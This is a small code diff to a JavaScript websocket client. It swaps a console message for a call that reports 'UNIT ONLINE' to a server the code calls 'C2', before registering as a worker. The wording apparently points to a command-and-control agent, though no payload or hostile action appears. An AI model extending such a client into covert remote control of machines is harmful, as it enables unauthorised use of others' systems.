@@ -26,7 +26,7 @@ function connect() {
     }
 
     ws.on('open', () => { 
-        console.log("Connected to C2."); 
+            logToC2("✅ UNIT ONLINE: VERSION 5.0 (STUDIO READY)"); 
         ws.send(JSON.stringify({ type: 'REGISTER_WORKER' })); 
     });
 
